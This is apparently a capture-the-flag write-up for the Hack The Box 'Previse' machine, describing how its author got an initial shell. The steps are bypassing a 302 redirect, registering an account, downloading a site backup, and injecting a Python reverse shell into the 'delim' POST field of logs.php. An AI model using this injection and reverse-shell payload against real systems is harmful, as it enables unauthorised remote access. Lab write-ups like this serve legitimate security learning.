# Initial shell as www-data
## Observing some links/pages redirected(302) to login.php like files.php and accounts.php [[Previse/10 - Common Enumeration]] in gobuster output
Observing some links/pages redirected(302) to login.php like files.php and accounts.php [[Previse/10 - Common Enumeration]] in gobuster output. 
![[Pasted image 20210918105117.png]]
## The 302 redirect reponse can be changed to 200 OK to access these pages/links
![[Pasted image 20210918111111.png]]
![[Pasted image 20210918111454.png]]
## Making new account to login and access files uploaded and other options
Making new account to login and access files uploaded and other options.
![[Pasted image 20210918111728.png]]
User 'clarkey' was successfully added.
![[Pasted image 20210918111832.png]]
## Now logging in as clarkey 'user'
![[Pasted image 20210918112005.png]]
## Accessing files as authenticated user
![[Pasted image 20210918112109.png]]
## Downloading SITEBACKUP.ZIP file
![[Pasted image 20210918112214.png]]
## Inspecting contents of SITEBACKUP.ZIP, found vulnerable section where code code for reverse shell could be injected
Inspecting contents of SITEBACKUP.ZIP, found vulnerable section where code code for reverse shell could be injected.
![[Pasted image 20210918113156.png]]
## Getting shell as www-data
Getting shell as www-data by injecting python reverse shell `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.98",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'` in POST request of http://10.10.11.104/logs.php like below
`delim=comma;python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.98",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'`
![[Pasted image 20210918113810.png]]


